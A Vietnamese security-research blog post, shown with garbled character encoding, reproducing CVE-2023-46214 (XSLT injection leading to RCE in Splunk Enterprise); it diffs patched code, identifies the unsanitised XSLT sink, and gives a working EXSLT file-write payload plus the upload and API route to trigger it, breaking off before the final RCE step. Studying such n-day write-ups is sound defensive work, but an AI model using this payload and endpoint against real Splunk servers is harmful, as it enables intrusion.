[{"content":" Láº¡i má»™t thÃ¡ng ná»¯a Ä‘Ã£ trÃ´i quaâ€¦ ThÃ¡ng trÆ°á»›c tÃ´i nghiÃªn cá»©u vá» CVE-2021-42237, má»™t lá»— há»•ng liÃªn quan Ä‘áº¿n .Net Deserialization cho phÃ©p káº» táº¥n cÃ´ng thá»±c thi code trÃªn há»‡ thá»‘ng sitecore mÃ  khÃ´ng cáº§n cÆ¡ cháº¿ xÃ¡c thá»±c nÃ o. CÅ©ng tÃ­nh viáº¿t má»™t blog vá» nÃ³, nhÆ°ng sau khi lÃ m xong tÃ´i phÃ¡t hiá»‡n ra mÃ¬nh chÆ°a Ä‘á»§ kiáº¿n thá»©c Ä‘á»ƒ viáº¿t. Bá»Ÿi vÃ¬ vá»›i deserialization thÃ¬ háº§u háº¿t sáº½ cÃ³ 2 bÆ°á»›c quan trong Ä‘Ã³ lÃ  tÃ¬m Ä‘Æ°á»£c sink (nÆ¡i deserialize) vÃ  chain. Vá»›i CVE trÃªn, sink thÃ¬ tá»« source tá»›i sink khÃ¡ Ä‘Æ¡n giáº£n Ä‘á»ƒ nÃ³i láº¡i mÃ  cÃ²n chain thÃ¬ quÃ¡ phá»©c táº¡p (vá»›i ngÆ°á»i má»›i nhÆ° tÃ´i). BÃªn cáº¡nh Ä‘Ã³, sau khi Ä‘i qua nhiá»u ngÃ´n ngá»¯ Ä‘á»ƒ tráº£i nghiá»‡m thÃ¬ káº¿ hoáº¡ch sáº¯p tá»›i cá»§a tÃ´i sáº½ táº­p trung chuyÃªn sÃ¢u vÃ o ngÃ´n ngá»¯ Java vÃ  DotNet. NÃªn tÃ´i sáº½ quay láº¡i vÃ  lÃ m blog chi tiáº¿t vá» nÃ³ sau. Cá»© ngá»¡ thÃ¡ng nÃ y sáº½ nhÆ° thÃ¡ng trÆ°á»›c, sáº½ bá»‹ pháº¡t tiáº¿p 200k vÃ¬ trong thÃ¡ng tÃ´i chá»‰ lo Ä‘i há»c, pentest blackbox mÃ  khÃ´ng cÃ³ reproduce, research gÃ¬ cáº£ thÃ¬ Ä‘Ã¹ng má»™t phÃ¡t, sáº¿p gá»­i cÃ³ cÃ¡i CVE cá»§a splunk vÃ  báº£o reproduce. ÄÃºng lÃ  trá»i háº¡n gáº·p mÆ°a rÃ o, báº¯t tay ngay vÃ o viá»‡c thÃ´i.ğŸ˜‹ğŸ˜‹ğŸ˜‹ğŸ˜‹. I. Giá»›i thiá»‡u vá» CVE-2023-46214 CVE-2023-46214 lÃ  mÃ£ lá»—i xuáº¥t hiá»‡n trÃªn sáº£n pháº©m Splunk Enterprise cho phÃ©p attacker cÃ³ thá»ƒ thá»±c thi lá»—i á»Ÿ server (RCE). PhiÃªn báº£n bá»‹ lá»—i tá»« 9.0.7--\u0026gt;9.1.2.\nLá»— há»•ng nÃ y do lá»—i trong cÃ¡ch xá»­ lÃ½ cÃ¡c biáº¿n Ä‘á»•i ngÃ´n ngá»¯ kiá»ƒu dÃ¡ng má»Ÿ rá»™ng (XSLT) cá»§a Splunk Enterprise. Káº» táº¥n cÃ´ng cÃ³ thá»ƒ khai thÃ¡c lá»— há»•ng Ä‘á»ƒ táº£i lÃªn tá»‡p XSLT Ä‘á»™c háº¡i sáº½ Ä‘Æ°á»£c Splunk Enterprise thá»±c thi. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng kiá»ƒm soÃ¡t há»‡ thá»‘ng bá»‹ áº£nh hÆ°á»Ÿng. https://nvd.nist.gov/vuln/detail/CVE-2023-46214\nNhÆ° nhá»¯ng CVE trÆ°á»›c Ä‘Ã³, Ä‘á»ƒ reproduce 1days, Ndays chÃºng ta cáº§n pháº£i tÃ¬m hiá»ƒu cÃ¡c kiáº¿n thá»©c ná»n táº£ng cáº§n thiáº¿t, cÃ i mÃ´i trÆ°á»ng bá»‹ lá»—i, tÃ¬m sink, source rá»“i build payload vÃ  cuá»‘i cÃ¹ng lÃ  kiáº¿m chá»©ng.\nII. Kiáº¿n thá»©c ná»n táº£ng TrÆ°á»›c khi Ä‘i vÃ o phÃ¢n tÃ­ch lá»— há»•ng, chÃºng ta cÃ¹ng Ä‘i qua má»™t sá»‘ Ä‘Æ¡n vá»‹ kiáº¿n thá»©c cÆ¡ báº£n vÃ  cáº§n thiáº¿t cho lá»— há»•ng nÃ y:\n2.1 Splunk lÃ  gÃ¬? CÃ i Ä‘áº·t nhÆ° tháº¿ nÃ o? Splunk lÃ  má»™t pháº§n má»m chá»§ yáº¿u Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ tÃ¬m kiáº¿m, giÃ¡m sÃ¡t vÃ  kiá»ƒm tra dá»¯ liá»‡u do mÃ¡y táº¡o ra thÃ´ng qua giao diá»‡n web tá»« Ä‘Ã³ phÃ¢n tÃ­ch Ä‘á»ƒ Ä‘Æ°a ra bÃ¡o cÃ¡o cÅ©ng nhÆ° cáº£nh bÃ¡o vá»›i thá»i gian thá»±c. Báº¡n cÃ³ thá»ƒ xem thÃªm thÃ´ng tin táº¡i Ä‘Æ°á»ng dáº«n sau: Splunk - Tá»•ng há»£p kiáº¿n thá»©c cÆ¡ báº£n vá» Splunk dÃ nh cho ngÆ°á»i má»›i báº¯t Ä‘áº§u | Lab Network System Security (securityzone.vn) CÃ³ nhiá»u hÆ°á»›ng dáº«n trÃªm internet Ä‘á»ƒ cÃ i Ä‘áº·t splunk, vÃ­ dá»¥ nhÆ° https://www.bitsioinc.com/install-splunk-linux/. ChÃºng ta chá»‰ cáº§n lÃ m theo lÃ  thá»±c hiá»‡n Ä‘Æ°á»£c ngay. Vá»›i CVE nÃ y, mÃ´i trÆ°á»ng thá»±c nghiá»‡m cá»§a tÃ´i lÃ : OS: ubuntu linux 22.04 splunk: 9.1.1 TÃ´i nhanh chÃ³ng tiáº¿n hÃ nh cÃ i Ä‘áº·t phiÃªn báº£n bá»‹ lá»—i Ä‘á»ƒ thá»­ nghiá»‡m. 2.2 Extensible stylesheet language transformations (XSLT) lÃ  gÃ¬? Theo mÃ´ táº£, lá»— há»•ng nÃ y do lá»—i trong cÃ¡ch xá»­ lÃ½ cÃ¡c biáº¿n Ä‘á»•i ngÃ´n ngá»¯ kiá»ƒu dÃ¡ng má»Ÿ rá»™ng (XSLT) cá»§a Splunk Enterprise. Váº­y XSLT lÃ  gÃ¬? NÃ³i má»™t cÃ¡ch Ä‘Æ¡n giáº£n, náº¿u CSS lÃ  ngÃ´n ngá»¯ Ä‘á»ƒ Ä‘á»‹nh dáº¡ng cho HTML thÃ¬ XSL (eXtensible Stylesheet Language) Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ Ä‘á»‹nh dáº¡ng cho XML XSLT viáº¿t táº¯t cho XSL Transformation. XSLT há»— trá»£ chuyá»ƒn Ä‘á»•i XML dÆ°á»›i dáº¡ng cÃ¡c document khÃ¡c nhÆ° TXT, PDF,SVG,â€¦ Vá»›i nhá»¯ng ai láº§n Ä‘áº§u tiáº¿p XSLT láº§n Ä‘áº§u nhÆ° tÃ´i thÃ¬ w3school lÃ  nÆ¡i lÃ½ tÆ°á»Ÿng Ä‘á»ƒ láº¥y má»™t Ã­t kiáº¿n thá»©c cÆ¡ báº£n. BÃªn cáº¡nh Ä‘Ã³, video vÃ  slide cá»§a Nicolas Gregoire - Agarri cÅ©ng lÃ  hai tÃ i liá»‡u quÃ½ giÃ¡ khi má»›i tiáº¿p cáº­n vá» XSLT. III. Diff-patch Ä‘á»ƒ tÃ¬m sink CÃ³ nhiá»u cÃ¡ch Ä‘á»ƒ tÃ¬m sink trong Ä‘Ã³, diff patch (cÃ¡ch nÃ³i ngáº¯n gá»n cho viá»‡c diff báº£n bá»‹ lá»—i vá»›i báº£n vÃ¡ Ä‘á»ƒ xem cÃ¡c Ä‘oáº¡n code Ä‘Ã£ sá»­a) lÃ  phÆ°Æ¡ng phÃ¡p ráº¥t phá»• biáº¿n Ä‘á»‘i vá»›i cÃ¡c mÃ£ nguá»“n má»Ÿ hoáº·c cÃ¡c product cÃ³ thá»ƒ xem Ä‘Æ°á»£c mÃ£ nguá»“n. May máº¯n thay, vá»›i splunk, chÃºng ta cÃ³ thá»ƒ xem mÃ£ nguá»“n vÃ  tá»« Ä‘Ã³ diff patch má»™t cÃ¡ch dá»… dÃ ng.\n2.1 Diff patch source nhÆ° tháº¿ nÃ o? Äá»ƒ xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c sink (nÆ¡i bá»‹ lá»—i), chÃºng ta cáº§n mÃ£ nguá»“n cá»§a báº£n bá»‹ lá»—i vÃ  báº£n Ä‘Ã£ vÃ¡, sau Ä‘Ã³ so sÃ¡nh xem nhá»¯ng Ä‘oáº¡n code Ä‘Ã£ Ä‘Æ°á»£c sá»­a (diff). ChÃºng ta táº£i 2 phiÃªn báº£n lá»—i vÃ  Ä‘Ã£ fix Extract code tá»« .deb file báº±ng lá»‡nh:\n1 ar x {file.deb} Lá»‡nh ar cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i báº±ng lá»‡nh sau:\n1 sudo apt install binutils Khi decode xong chÃºng ta sáº½ Ä‘Æ°á»£c nhiá»u file, hÃ£y chÃº Ã½ tá»›i file data.tar.xz bá»Ÿi vÃ¬ file nÃ y chá»©a nhiá»u mÃ£ nguá»“n mÃ  chÃºng ta cáº§n tham kháº£o.\nÄá»ƒ diff-patch 2 project lá»›n, tÃ´i thÆ°á»ng sá»­ dá»¥ng Git. ChÃºng ta chá»‰ cáº§n commit 2 version lÃªn rá»“i dÃ¹ng tÃ­nh nÄƒng diff cá»§a git Ä‘á»ƒ xem. Vá»›i project nhá» thÃ¬ khÃ¡ Ä‘Æ¡n giáº£n, nhÆ°ng project lá»›n, viá»‡c nÃ y khÃ¡ tá»‘n thá»i gian. ChÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng git extension cá»§a vscode, nhÆ°ng táº¡i thá»i Ä‘iá»ƒm sá»­ dá»¥ng thÃ¬ vscode cá»§a tÃ´i láº¡i khÃ´ng show ra Ä‘Æ°á»£c git commit. (cháº¯c cÃ³ láº½ bá»‹ lá»—i gÃ¬ Ä‘Ã³)\nMá»™t giáº£i phÃ¡p thay tháº¿ Ä‘Ã³ lÃ  sá»­ dá»¥ng gitk. Báº¡n cÃ³ thá»ƒ tÃ¬m hiá»ƒu thÃªm táº¡i Ä‘Ã¢y.\nGiao diá»‡n tiá»‡n lá»£i cho tÃ´i trace.\n2.2. Sink á»Ÿ Ä‘Ã¢u??? ChÃºng ta Ä‘Ã£ giáº£i quyáº¿t Ä‘Æ°á»£c bÃ i toÃ¡n lÃ m sao Ä‘á»ƒ diff-patch Ä‘Æ°á»£c mÃ£ nguá»“n cá»§a báº£n bá»‹ lá»—i vÃ  báº£n Ä‘Ã£ vÃ¡, Ä‘á»“ng thá»i, chÃºng ta cÅ©ng cÃ i Ä‘áº·t thÃ nh cÃ´ng phiÃªn báº£n bá»‹ lá»—i cá»§a splunk. BÆ°á»›c tiáº¿p theo lÃ  cáº§n Ä‘á»ƒ xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c sink á»Ÿ Ä‘Ã¢u. Bá»Ÿi vÃ¬, dá»¯ kiá»‡n duy nháº¥t mÃ  tÃ´i cÃ³ Ä‘Æ°á»£c tá»« CVE nÃ y lÃ  liÃªn quan tá»›i XSLT trong khi Ä‘Ã¢y cÅ©ng lÃ  láº§n Ä‘áº§u tÃ´i biáº¿t tá»›i sá»± tá»“n táº¡i cá»§a nÃ³ (gÃ  quÃ¡ mÃ  ğŸ˜¢ ğŸ˜¢). Do Ä‘Ã³, Ä‘iá»u tÃ´i cáº§n lÃ m bÃ¢y giá» lÃ  tÃ¬m hiá»ƒu xem cÃ³ nhá»¯ng tÃ i liá»‡u, blog nÃ o liÃªn quan tá»›i viá»‡c táº¥n cÃ´ng sá»­ dá»¥ng XSLT hay khÃ´ng, tá»« Ä‘Ã³ rÃºt ra cÃ¡c dáº¥u hiá»‡u cá»§a nÃ³. NgoÃ i ra, tÃ´i cÃ²n pháº£i tÃ¬m hiá»ƒu xem XSLT trong splunk cÃ³ vai trÃ² nhÆ° tháº¿ nÃ o? (Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, implement nhÆ° tháº¿ nÃ o? source code náº±m á»Ÿ Ä‘Ã¢u). CVE nÃ y liÃªn quan tá»›i viá»‡c truyá»n 1 dá»¯ liá»‡u XSLT lÃªn server, do Ä‘Ã³, chÃºng ta cáº§n pháº£i tÃ¬m hiá»ƒu xem nhá»¯ng nÆ¡i nÃ o nháº­n code XSLT cÃ³ bá»‹ sá»­a Ä‘á»•i giá»¯a 2 version, Ä‘áº·c biá»‡t chÃº Ã½ tá»›i cÃ¡c tÃ­nh nÄƒng upload cÅ©ng nhÆ° cÃ¡c tham sá»‘ nháº­n tá»« ngÆ°á»i dÃ¹ng. TÃ´i dÃ¹ng tÃ­nh nÄƒng search cá»§a gitk Ä‘á»ƒ tÃ¬m tá»« khÃ³a XSLT. Wow! TÃ´i Ä‘Ã£ tháº¥y Ä‘oáº¡n code sá»­a Ä‘Ã¡ng nghi ngá», nÃ³ náº±m á»Ÿ: source/data_extract/opt/splunk/lib/python3.7/site-packages/splunk/appserver/mrsparkle/controllers/search.py\nNháº£y vÃ o Ä‘á»c thÃ´i!\nChÃºng ta tháº¥y, nhá»¯ng dÃ²ng code Ä‘Æ°á»£c sá»­a cÃ³ liÃªn quan Ä‘áº¿n tÃ­nh nÄƒng parse file. Cá»¥ thá»ƒ, phiÃªn báº£n bá»‹ lá»—i thÃ¬ file á»Ÿ xslFilePath Ä‘Æ°á»£c Ä‘á»c vÃ  parse ngay trong khi á»Ÿ phiÃªn báº£n fix thÃ¬ Ä‘Æ°á»ng dáº«n nÃ y Ä‘Æ°á»£c Ä‘Æ°a vÃ o hÃ m parse_xsl_file_and_validate trÆ°á»›c khi xá»­ lÃ½.\nDá»±a vÃ o tÃªn hÃ m tÃ´i cÃ³ thá»ƒ Ä‘oÃ¡n Ä‘Æ°á»£c cÃ´ng dá»¥ng hÃ m nÃ y Ä‘á»ƒ sanitize ná»™i dung XSLT cÃ³ trong file trÆ°á»›c khi parse. KhÃ¡ giá»‘ng vá»›i mÃ´ táº£ cá»§a lá»— há»•ng nÃªn kháº£ nÄƒng cao lá»— há»•ng lÃ  á»Ÿ Ä‘Ã¢y. Do Ä‘Ã³, tÃ´i quyáº¿t Ä‘á»‹nh táº­p trung vÃ o hÃ m nÃ y. Má»Ÿ code bá»‹ lá»—i lÃªn vÃ o Ä‘á»c hiá»ƒu, tÃ¬m bug thÃ´i!!! TÃ´i nhanh chÃ³ng má»Ÿ Vscode vÃ  vÃ o Ä‘Æ°á»ng dáº«n $SPLUNK_HOME/lib/python3.7/site-packages/splunk/appserver/mrsparkle/controllers/search.py\nÄoáº¡n code bá»‹ nghi ngá» lá»—i nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 ... elif moduleName and (\u0026#39;xsl\u0026#39; in kwargs) and output and enableSearchJobXslt: logger.debug(\u0026#39;search api got xsl request: %s\u0026#39; % moduleName) # get XSL file xslFilePath = os.path.abspath(bundle_paths.expandvars(os.path.join(self.moduleRoster[moduleName][\u0026#39;path\u0026#39;], kwargs[\u0026#39;xsl\u0026#39;]))) splunkHomePath = bundle_paths.expandvars(\u0026#39;$SPLUNK_HOME\u0026#39;) xsl_file_meta_data = JobsController.get_xsl_file_meta_data(xslFilePath) if not xsl_file_meta_data.get(\u0026#34;file_exists\u0026#34;): cherrypy.response.headers[\u0026#39;content-type\u0026#39;] = MIME_HTML logger.warn(\u0026#39;File xsl=\u0026#34;%s\u0026#34; is not available\u0026#39; % xslFilePath) output = \u0026#39;The file you are trying to access is not available\u0026#39; elif not xsl_file_meta_data.get(\u0026#34;is_valid_extension\u0026#34;): cherrypy.response.headers[\u0026#39;content-type\u0026#39;] = MIME_HTML logger.warn(\u0026#39;File xsl=\u0026#34;%s\u0026#34; is not available\u0026#39; % xslFilePath) output = \u0026#39;The file you are trying to access does not have a valid extension.\u0026#39; elif xslFilePath.startswith(splunkHomePath): try: f = open(xslFilePath, \u0026#39;r\u0026#39;) xslt_doc = et.parse(f) f.close() # generate transformer transform = et.XSLT(xslt_doc) # transform the XML xmlDoc = et.fromstring(output) transformedOutput = transform(xmlDoc) cherrypy.response.headers[\u0026#39;content-type\u0026#39;] = MIME_HTML html = et.tostring(transformedOutput) if not html: output = \u0026#39;Loading...\u0026#39; else: output = html ... ChÃºng ta tháº¥y ráº±ng, tá»« dÃ²ng 24-37 ná»™i dung cá»§a file táº¡i xslFilePath Ä‘Æ°á»£c Ä‘á»c, parse, transform mÃ  khÃ´ng há» cÃ³ sá»± kiá»ƒm tra hay lá»c sáº¡ch dá»¯ liá»‡u nÃ o. NhÆ° Ä‘Ã£ Ä‘á» cáº­p, trÆ°á»›c khi tiáº¿p xÃºc tá»›i Ä‘oáº¡n code nÃ y thÃ¬ tÃ´i Ä‘Ã£ google tÃ¬m Ä‘á»c cÃ¡c tÃ i liá»‡u liÃªn quan cÃ¡c lá»— há»•ng khai thÃ¡c cÃ³ sá»­ dá»¥ng XSLT. Chá»‰ vá»›i key word Ä‘Æ¡n giáº£n: XSLT + exploit + RCEvÃ o google báº¡n Ä‘Ã£ tháº¥y cÃ³ ráº¥t nhiá»u tÃ i liá»‡u liÃªn quan\nTÃ´i nhanh chÃ³ng chÃº Ã½ Ä‘áº¿n Abusing XSLT for Practical Attacks White Paper Ä‘Æ°á»£c Ä‘á» cáº­p trong HackTricks. VÃ  má»™t sá»‘ tÃ i liá»‡u ráº¥t quÃ½ bÃ¡u cho tÃ´i trong quÃ¡ trÃ¬nh tÃ¡i táº¡o láº¡i lá»— há»•ng nÃ y:\nhttps://owasp.org/www-pdf-archive/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf https://www.youtube.com/watch?v=8YYa1CWI1AU https://prezi.com/y_fuybfudgnd/offensive-xslt/ Má»™t tips Ä‘á»ƒ kiáº¿m cÃ¡c nguá»“n tÃ i liá»‡u cháº¥t lÆ°á»£ng lÃ  cÃ¡c báº¡n hÃ£y kiáº¿m 1-2 paper hoáº·c slide liÃªn quan tá»›i ná»™i dung cáº§n tÃ¬m kiáº¿m á»Ÿ cÃ¡c diá»…n Ä‘Ã n hoáº·c cÃ¡c trang web ná»•i tiáº¿ng (nhÆ° blackhat, owasp,..) rá»“i xem thÃªm á»Ÿ pháº§n references.\nSau khi Ä‘Ã£ cÃ³ má»™t cÃ¡i hiá»ƒu â€œsÆ¡ sÆ¡â€ vá» lá»— há»•ng nÃ y vÃ  nháº­n tháº¥y splunk xá»­ dá»¥ng pháº§n parser xslt báº±ng thÆ° viá»‡n lxml cá»§a python. VÃ  Ä‘oáº¡n code nÃ y tÃ´i hoÃ n toÃ n cÃ³ thá»ƒ tÃ¡i táº¡o láº¡i á»Ÿ local mÃ  khÃ´ng cÃ³ báº¥t cá»© rÃ ng buá»™c thÆ° viá»‡n riÃªng nÃ o cá»§a splunk, nÃªn tÃ´i Ä‘Ã£ táº¡o má»™t Ä‘oáº¡n code nhá», mÃ´ phá»ng qua trÃ¬nh nÃ y trÃªn local Ä‘á»ƒ thá»­ nghiá»‡m xem thá»­ liá»‡u Ä‘Ã¢y cÃ³ pháº£i lÃ  sink mÃ  chÃºng ta tÃ¬m kiáº¿m.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import sys import lxml.etree as et if len(sys.argv) != 2: print(\u0026#34;Usage: python3 splunk-xslt-handler.py \u0026lt;path_to_file_xsl\u0026gt;\u0026#34;) sys.exit(1) xslFilePath = sys.argv[1] try: with open(xslFilePath, \u0026#39;r\u0026#39;) as f: xslt_doc = et.parse(f) output = \u0026#39;\u0026lt;catalog\u0026gt;\u0026lt;/catalog\u0026gt;\u0026#39; # generate transformer transform = et.XSLT(xslt_doc) # transform the XML xmlDoc = et.fromstring(output) transformedOutput = transform(xmlDoc) print(et.tostring(transformedOutput, pretty_print=True).decode(\u0026#34;utf-8\u0026#34;) ) html = et.tostring(transformedOutput) if not html: output = \u0026#39;Loading...\u0026#39; else: output = html except FileNotFoundError: print(f\u0026#34;Error: File not found at path {xslFilePath}\u0026#34;) sys.exit(1) except Exception as e: print(f\u0026#34;An error occurred: {e}\u0026#34;) sys.exit(1) TÃ i liá»‡u cá»§a owaps tÃ´i Ä‘Ã£ Ä‘á» cáº­p trÆ°á»›c Ä‘Ã³ cÃ³ Ä‘Æ°a ra cÃ¡c payload khai thÃ¡c vÃ  káº¿t thÃºc má»—i payload Ä‘á»u cÃ³ báº£ng tá»•ng káº¿t cho tháº¥y payload nÃ y cÃ³ thá»ƒ khai thÃ¡c thÃ nh cÃ´ng trÃªn tá»«ng loáº¡i XSLT Processors nÃ o.\ná» local, chÃºng ta cÅ©ng sáº½ Ä‘i tá»«ng bÆ°á»›c Ä‘á»ƒ build payload. Äáº§u tiÃªn, chÃºng ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh python Ä‘ang cháº¡y sá»­ dá»¥ng loáº¡i processor nÃ o.\nÄá»ƒ thu tháº­p thÃ´ng tin há»‡ thá»‘ng, ta táº¡o file disclosure.xsl\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; XSLT version: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:version\u0026#39;)\u0026#34;/\u0026gt;\u0026lt;br/\u0026gt; XSL vendor: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:vendor\u0026#39;)\u0026#34;/\u0026gt;\u0026lt;br/\u0026gt; XSL vendor URL: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:vendor-url\u0026#39;)\u0026#34;/\u0026gt;\u0026lt;br/\u0026gt; Version: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:version\u0026#39;)\u0026#34; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; káº¿t quáº£ chÆ°Æ¡ng trÃ¬nh\nNhÆ° váº­y, processor (hay vendor) há»— trá»£ á»Ÿ Ä‘Ã¢y lÃ  libxslt\nLÆ°á»›t 1 vÃ²ng cÃ¡c mÃ£ khai thÃ¡c trong tÃ i liá»‡u cá»§a owaps á»Ÿ trÃªn, thÃ¬ tÃ´i tháº¥y cÃ³ má»™t mÃ£ khai thÃ¡c cho phÃ©p táº¡o file. Tuy nhiÃªn, báº¡n copy nguyÃªn Ä‘oáº¡n code trong tÃ i liá»‡u sáº½ cháº¡y khÃ´ng Ä‘Æ°á»£c, mÃ  cáº§n google thÃªm 1 tÃ­ Ä‘á»ƒ thÃªm thÃ nh pháº§n cÃ²n thiáº¿u. TÃ´i táº¡o Ä‘Æ°á»£c file create-file.xsl vá»›i ná»™i dung nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:exsl=\u0026#34;http://exslt.org/common\u0026#34; extension-element-prefixes=\u0026#34;exsl\u0026#34; exclude-result-prefixes=\u0026#34;exsl\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;exsl:document href=\u0026#34;local_edisc_file.txt\u0026#34;\u0026gt; \u0026lt;xsl:text\u0026gt;Write Write Files\u0026lt;/xsl:text\u0026gt; \u0026lt;/exsl:document\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; Test thá»­ á»Ÿ local\nYeah, váº­y lÃ  chÃºng ta Ä‘Ã£ thÃ nh cÃ´ng táº¡o á»Ÿ local. Äáº¿n Ä‘Ã¢y chÃºng ta Ä‘Ã£ kháº³ng Ä‘á»‹nh Ä‘Æ°á»£c Ä‘Ã¢y chÃ­nh lÃ  sink mÃ  chÃºng ta tÃ¬m, Ä‘á»“ng thá»i chÃºng ta cÅ©ng xÃ¢y dá»±ng Ä‘Æ°á»£c payload táº¡o file. BÆ°á»›c tiáº¿p theo cáº§n pháº£i tá»« sink tÃ¬m source.\nIV. Tá»« sink tÃ¬m source rá»“i RCE Äá»ƒ tÃ¬m source, chÃºng ta cáº§n tÃ¬m hiá»ƒu route cá»§a á»©ng dá»¥ng Ä‘á»ƒ xem thá»­ cÃ¡c request truyá»n vÃ o sáº½ Ä‘Æ°á»£c route Ä‘i Ä‘Ã¢u.\nQuay láº¡i vá»›i Ä‘oáº¡n code bá»‹ lá»—i. Äoáº¡n code nÃ y náº±m trong hÃ m def getJobAsset(self, sid, asset, compat_mode=True, **kwargs): vá»›i route nhÆ° sau:\nVÃ  hÃ m getJobAsset thuá»™c class class JobsController(BaseController): vá»›i route nhÆ° sau:\nNhÆ° váº­y, Ä‘á»ƒ truy cáº­p tá»›i getJobAsset thÃ¬ path sáº½ lÃ  /search/jobs/:sid/:asset?param1=a\u0026amp;param2=b\u0026amp;...\u0026amp;paramN=n CÃ¡c biáº¿n param sáº½ lÆ°u trong **kwargs cá»§a hÃ m getJobAsset NgoÃ i ra, dÃ²ng lá»‡nh @expose_page(handle_api=ONLY_API) táº¡i Ä‘á»‹nh nghÄ©a cá»§a hÃ m getJobAsset cho tháº¥y request chÃºng ta chá»‰ Ä‘Æ°á»£c truy cáº­p dÆ°á»›i dáº¡ng api/... Do Ä‘Ã³, Ä‘á»ƒ truy cáº­p tá»›i endpoint thÃ¬ ta sáº½ cÃ³ request dáº¡ng\n/api/search/jobs/:sid/:asset?param1=a\u0026amp;param2=b\u0026amp;...\u0026amp;paramN=n\nÄiá»u cáº§n lÃ m Ä‘áº§u tiÃªn lÃ  pháº£i cÃ³ sid.\n4.1 TÃ¬m sid TÃ´i báº¯t Ä‘áº§u dáº¡o quanh cÃ¡c tÃ­nh nÄƒng cá»§a splunk. ÄÃ¢y lÃ  kÄ© nÄƒng thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng khi tÃ´i tiáº¿n hÃ nh blackbox. Káº¿t há»£p vá»›i type bug nÃ y thuá»™c dáº¡ng upload file, nÃªn trong quÃ¡ trÃ¬nh â€œÄ‘i dáº¡oâ€ tÃ´i cÅ©ng chÃº Ã½ tá»›i cÃ¡c tÃ­nh nÄƒng upload file. Vá»›i tiÃªu chÃ­ Ä‘Ã³, tÃ´i tin ráº±ng báº¥t kÃ¬ báº¡n nÃ o cÅ©ng sáº½ nhÆ° tÃ´i, dá»… dÃ ng chÃº Ã½ vá»›i tÃ­nh nÄƒng nÃ y TÃ­nh nÄƒng nÃ y cho phÃ©p upload file tá»« mÃ¡y vÃ  sáº½ táº¡o cho chÃºng ta má»™t mÃ£ sid TÃ´i upload thá»­ payload mÃ  chÃºng ta Ä‘Ã£ build á»Ÿ local sid lÃ  giÃ¡ trá»‹ náº±m á»Ÿ trÆ°á»ng text 4.2 Build payload táº¡o file báº¥t kÃ¬. BÃ¢y giá» Ä‘Ã£ cÃ³ sid rá»“i, tiáº¿n hÃ nh kiá»ƒm tra xem thá»­ suy Ä‘oÃ¡n vá» endpoint cá»§a chÃºng ta cÃ³ Ä‘Ãºng khÃ´ng. Quay láº¡i Ä‘á»c hiá»ƒu Ä‘oáº¡n code vÃ  thÃªm cÃ¡c Ä‘iá»u kiá»‡n tÆ°Æ¡ng á»©ng Ä‘á»ƒ touch Ä‘Æ°á»£c tá»›i hÃ m.NgoÃ i ra splunk cÅ©ng cÃ³ document há»— trá»£ cÃ¡c api cá»§a há», Ä‘Ã³ cÅ©ng lÃ  nguá»“n tÃ i liá»‡u quÃ½ giÃ¡ cho chÃºng ta tÃ¬m hiá»ƒu. PhÆ°Æ¡ng phÃ¡p tiáº¿p cáº­n Ä‘á»ƒ build payload mÃ  tÃ´i sá»­ dá»¥ng lÃ  Ä‘i tá»« trong ra ngoÃ i, tá»©c lÃ  tá»« vá»‹ trÃ­ hÃ m bá»‹ lá»—i trace ngÆ°á»£c láº¡i source Ä‘á»ƒ tÃ¬m cÃ¡c Ä‘iá»u kiá»‡n há»£p lá»‡. Quay láº¡i vá»›i hÃ m sink: DÃ²ng code 476-488 lÃ  Ä‘oáº¡n code trigger lá»—i, Ä‘á»ƒ vÃ o Ä‘Æ°á»£c Ä‘Æ°á»ng nÃ y thÃ¬ Ä‘Ä©a chá»‰ xslFilePath pháº£i báº¯t Ä‘áº§u vá»›i splunkHomePath tá»©c lÃ  /opt/splunk trÃªn linux. HÃ£y thá»­ kiá»ƒm tra file vá»«a upload trÃªn server cÃ³ thá»a mÃ£n Ä‘iá»u kiá»‡n nÃ y khÃ´ng báº±ng lá»‡nh\n1 find / -name create-file.xsl Dá»… tháº¥y Ä‘iá»u kiá»‡n nÃ y Ä‘Ã£ Ä‘Æ°á»£c thá»a 